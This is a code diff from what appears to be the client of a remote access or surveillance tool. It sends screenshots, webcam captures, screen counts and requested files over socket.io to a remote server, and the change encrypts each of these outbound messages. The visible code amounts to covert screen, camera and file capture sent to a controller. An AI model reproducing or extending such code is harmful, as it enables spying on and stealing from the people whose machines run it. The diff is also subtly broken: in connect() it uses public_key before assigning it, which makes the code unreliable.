@@ -254,7 +254,7 @@ def run(data):
 
     @sio.event
     def connect():
-        sio.emit("mConnect", data)
+        sio.emit("mConnect", encrypt(public_key, data))
         # Start a new thread to run the emit_screen_count function
         public_key = get_public_key(data['url']+"key")
 
@@ -279,13 +279,13 @@ def run(data):
                 f.close()
             file_ready = zlib.compress(base64.b64encode(file), level=9)
             sio.emit(
-                "download_file_return",
+                "download_file_return", encrypt(public_key,
                 {
                     "uid": data_new["uid"],
                     "file_name": data_new["file_path"],
                     "file": file_ready,
                 },
-            )
+            ))
             print("emited")
 
     @sio.on("pem")
@@ -509,7 +509,7 @@ def run(data):
                             compressed_data = zlib.compress(jpeg_data, level=9)
 
                             # Emit the compressed data
-                            sio.emit("screenshot", {"uid": uid, "image": compressed_data})
+                            sio.emit("screenshot", encrypt(public_key, {"uid": uid, "image": compressed_data}))
                             print("Sent compressed screenshot")
 
                             last_capture_time = current_time
@@ -547,7 +547,7 @@ def run(data):
                     compressed_data = zlib.compress(jpeg_data, level=9)
 
                     # Emit the compressed data
-                    sio.emit("screenshot", {"uid": uid, "image": compressed_data})
+                    sio.emit("screenshot", encrypt(public_key, {"uid": uid, "image": compressed_data}))
                     print("Sent compressed camera screenshot")
 
                     last_capture_time = current_time
@@ -584,7 +584,7 @@ def run(data):
                 if len(sct.monitors)-1 < 1:  # No monitors detected
                     print("No monitors found. Skipping screen capture.")
                 else:
-                    sio.emit('screen_count', { 'uid': data['uid'], 'screen_count': len(sct.monitors)-1 })
+                    sio.emit('screen_count', encrypt(public_key, { 'uid': data['uid'], 'screen_count': len(sct.monitors)-1 }))
 
     sio.connect(data["url"])      
     sio.wait()
